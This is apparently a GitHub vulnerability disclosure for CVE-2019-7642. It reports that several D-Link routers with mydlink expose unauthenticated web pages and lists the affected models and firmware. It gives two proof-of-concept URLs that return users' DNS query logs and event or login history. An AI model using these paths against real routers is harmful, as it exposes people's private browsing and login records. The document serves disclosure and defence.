# CVE-2019-7642
D-Link routers with the mydlink feature have some web interfaces without authentication requirements. An attacker can remotely obtain users' DNS query logs and login logs.

Vulnerable targets include but are not limited to the latest firmware versions of DIR-817LW (A1-1.04), DIR-816L (B1-2.06), DIR-850L (A1-1.09) and DIR-868L (A1-1.10).

PoC1: http://target/mydlink/get_LogDnsQuery.asp
![poc1](https://github.com/xw77cve/CVE-2019-7642/blob/master/CVE-2019-7642-poc1.PNG)
PoC2: http://target/mydlink/get_TriggedEventHistory.asp
![poc2](https://github.com/xw77cve/CVE-2019-7642/blob/master/CVE-2019-7642-poc2.PNG)

